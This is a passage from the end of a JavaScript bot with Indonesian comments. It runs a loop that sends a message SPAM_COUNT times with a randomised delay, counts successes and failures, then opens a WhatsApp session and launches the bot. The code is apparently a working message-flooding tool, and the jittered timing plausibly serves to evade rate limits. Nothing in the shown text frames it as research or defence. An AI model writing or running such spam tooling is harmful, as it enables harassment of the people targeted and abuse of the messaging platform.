    for (let i = 0; i < SPAM_COUNT; i++) {
        const success = await sendMessage();
        if (success) {
            successCount++;
        } else {
            failedCount++;
        }
        const delay = SPAM_DELAY + Math.floor(Math.random() * 300);
        await new Promise(resolve => setTimeout(resolve, delay));
    }

    return { successCount, failedCount };
}
///////////////////[END FUNC]////////////////
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();
